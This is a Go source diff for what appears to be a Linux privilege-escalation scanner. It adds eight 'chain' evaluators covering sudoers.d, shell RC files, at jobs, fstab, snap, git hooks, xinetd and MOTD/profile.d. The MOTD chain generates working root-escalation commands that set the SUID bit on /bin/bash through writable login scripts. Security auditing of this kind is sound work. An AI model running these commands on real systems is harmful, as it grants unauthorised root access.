@@ -65,6 +65,14 @@ func init() {
 		&PasswordReuseChain{},         // E3: Cross-reference secret leakage against system accounts
 		&WildcardInjectionChain{},     // Internal #4: Shell script wildcard argument injection chain
 		&PythonHijackChain{},          // Internal #5: Python module search path & script dir hijack chain
+		&SudoersDropinChain{},         // #1 Sudoers.d Drop-In Writability chain
+		&ShellRCPoisonChain{},         // #2 Root Shell RC Poisoning chain
+		&AtJobRootChain{},             // #3 at Daemon Job Injection chain
+		&FstabMountChain{},            // #4 Fstab User-Mount & Missing Flag chain
+		&SnapEscapeChain{},            // #5 Snap/Flatpak SUID Helper Escape chain
+		&GitHookRootChain{},           // #6 Git Hook Injection on Shared Repos chain
+		&XinetdRootChain{},            // #7 Xinetd Service Configuration Hijack chain
+		&MotdProfiledChain{},          // #8 MOTD/Profile.d Login Execution chain
 	}
 }
 
@@ -1609,3 +1617,194 @@ func (c *PythonHijackChain) Evaluate(report *models.ScanReport) []ChainResult {
 	}
 	return results
 }
+
+// ── CHAIN 38: Sudoers.d Drop-In Writability ─────────────────
+type SudoersDropinChain struct{}
+
+func (c *SudoersDropinChain) Evaluate(report *models.ScanReport) []ChainResult {
+	var results []ChainResult
+	for _, s := range report.SudoersDropin {
+		risk := "100% CONFIRMED"
+		if !s.IsDangerous {
+			risk = "POTENTIAL"
+		}
+		results = append(results, ChainResult{
+			Name:        fmt.Sprintf("Sudoers Drop-In Rule Injection: %s", filepath.Base(s.Path)),
+			RiskLevel:   risk,
+			Description: s.Reason,
+			Exploit:     s.ExploitHint,
+			TargetPath:  s.Path,
+		})
+	}
+	return results
+}
+
+// ── CHAIN 39: Root Shell RC Poisoning ───────────────────────
+type ShellRCPoisonChain struct{}
+
+func (c *ShellRCPoisonChain) Evaluate(report *models.ScanReport) []ChainResult {
+	var results []ChainResult
+	for _, rc := range report.ShellRC {
+		risk := "100% CONFIRMED"
+		if rc.RiskLevel != "CRITICAL" {
+			risk = "POTENTIAL"
+		}
+		results = append(results, ChainResult{
+			Name:        fmt.Sprintf("Root Shell Initialization Poisoning: %s", filepath.Base(rc.Path)),
+			RiskLevel:   risk,
+			Description: rc.Reason,
+			Exploit:     rc.ExploitHint,
+			TargetPath:  rc.Path,
+		})
+	}
+	return results
+}
+
+// ── CHAIN 40: at Daemon Job Injection ───────────────────────
+type AtJobRootChain struct{}
+
+func (c *AtJobRootChain) Evaluate(report *models.ScanReport) []ChainResult {
+	var results []ChainResult
+	for _, at := range report.AtJobs {
+		risk := "100% CONFIRMED"
+		if !at.IsDangerous {
+			risk = "POTENTIAL"
+		}
+		results = append(results, ChainResult{
+			Name:        fmt.Sprintf("at Daemon Scheduled Job Injection: %s", filepath.Base(at.Path)),
+			RiskLevel:   risk,
+			Description: at.Reason,
+			Exploit:     at.ExploitHint,
+			TargetPath:  at.Path,
+		})
+	}
+	return results
+}
+
+// ── CHAIN 41: Fstab User-Mount & Hardening ──────────────────
+type FstabMountChain struct{}
+
+func (c *FstabMountChain) Evaluate(report *models.ScanReport) []ChainResult {
+	var results []ChainResult
+	for _, fs := range report.Fstab {
+		risk := "POTENTIAL"
+		if fs.IsDangerous {
+			risk = "POTENTIAL - SUID PAYLOAD DELIVERY"
+		}
+		results = append(results, ChainResult{
+			Name:        fmt.Sprintf("Insecure Mount Configuration: %s (%s)", fs.MountPoint, fs.FSType),
+			RiskLevel:   risk,
+			Description: fs.Reason,
+			Exploit:     fs.ExploitHint,
+			TargetPath:  fs.MountPoint,
+		})
+	}
+	return results
+}
+
+// ── CHAIN 42: Snap/Flatpak SUID Helper Escape ───────────────
+type SnapEscapeChain struct{}
+
+func (c *SnapEscapeChain) Evaluate(report *models.ScanReport) []ChainResult {
+	var results []ChainResult
+	for _, snap := range report.SnapAudit {
+		risk := "100% CONFIRMED"
+		if !snap.IsDangerous {
+			risk = "POTENTIAL"
+		}
+		name := fmt.Sprintf("Snap Confinement Bypass: %s", snap.Binary)
+		if snap.CVE != "" {
+			if snap.IsDangerous {
+				name = fmt.Sprintf("Snapd SUID Privilege Escalation: %s (%s)", snap.Binary, snap.CVE)
+			} else {
+				name = fmt.Sprintf("Flatpak Portal Sandbox Escape: %s (%s)", snap.Binary, snap.CVE)
+			}
+		}
+		results = append(results, ChainResult{
+			Name:        name,
+			RiskLevel:   risk,
+			Description: snap.Reason,
+			Exploit:     snap.ExploitHint,
+			TargetPath:  snap.Path,
+		})
+	}
+	return results
+}
+
+// ── CHAIN 43: Git Hook Injection in Shared Repos ────────────
+type GitHookRootChain struct{}
+
+func (c *GitHookRootChain) Evaluate(report *models.ScanReport) []ChainResult {
+	var results []ChainResult
+	for _, gh := range report.GitHooks {
+		risk := "100% CONFIRMED"
+		if !gh.IsDangerous {
+			risk = "POTENTIAL"
+		}
+		results = append(results, ChainResult{
+			Name:        fmt.Sprintf("Shared Git Hook Injection: %s (%s)", filepath.Base(gh.RepoPath), gh.HookName),
+			RiskLevel:   risk,
+			Description: gh.Reason,
+			Exploit:     gh.ExploitHint,
+			TargetPath:  gh.HookPath,
+		})
+	}
+	return results
+}
+
+// ── CHAIN 44: Xinetd Service Configuration Hijack ───────────
+type XinetdRootChain struct{}
+
+func (c *XinetdRootChain) Evaluate(report *models.ScanReport) []ChainResult {
+	var results []ChainResult
+	for _, x := range report.Xinetd {
+		risk := "100% CONFIRMED"
+		if !x.IsDangerous {
+			risk = "POTENTIAL"
+		}
+		results = append(results, ChainResult{
+			Name:        fmt.Sprintf("Xinetd Service Configuration Hijack: %s", x.ServiceName),
+			RiskLevel:   risk,
+			Description: x.Reason,
+			Exploit:     x.ExploitHint,
+			TargetPath:  x.ConfigFile,
+		})
+	}
+	return results
+}
+
+// ── CHAIN 45: MOTD / Profile.d Login Execution ──────────────
+type MotdProfiledChain struct{}
+
+func (c *MotdProfiledChain) Evaluate(report *models.ScanReport) []ChainResult {
+	var results []ChainResult
+	for _, w := range report.Writeable {
+		if strings.Contains(w.Type, "update-motd.d") {
+			exploit := fmt.Sprintf("echo 'chmod +s /bin/bash' >> %s", w.Path)
+			if strings.Contains(w.Type, "Directory") {
+				exploit = fmt.Sprintf("echo -e '#!/bin/sh\\nchmod +s /bin/bash' > %s/99-pwn && chmod +x %s/99-pwn", w.Path, w.Path)
+			}
+			results = append(results, ChainResult{
+				Name:        fmt.Sprintf("Writable MOTD Script Execution on Login: %s", filepath.Base(w.Path)),
+				RiskLevel:   "100% CONFIRMED",
+				Description: fmt.Sprintf("Script '%s' executes with root privileges whenever an administrator logs in via SSH or console.", w.Path),
+				Exploit:     exploit,
+				TargetPath:  w.Path,
+			})
+		} else if strings.Contains(w.Type, "profile.d") {
+			exploit := fmt.Sprintf("echo 'echo \"[!] compromised\"' >> %s", w.Path)
+			if strings.Contains(w.Type, "Directory") {
+				exploit = fmt.Sprintf("echo -e '#!/bin/sh\\necho \"[!] compromised\"' > %s/99-pwn.sh && chmod +x %s/99-pwn.sh", w.Path, w.Path)
+			}
+			results = append(results, ChainResult{
+				Name:        fmt.Sprintf("Writable Profile.d Script Execution on Login: %s", filepath.Base(w.Path)),
+				RiskLevel:   "POTENTIAL",
+				Description: fmt.Sprintf("Script '%s' is sourced by all interactive login shells. Modifying this script executes code under the context of any logging-in user (including root).", w.Path),
+				Exploit:     exploit,
+				TargetPath:  w.Path,
+			})
+		}
+	}
+	return results
+}
+
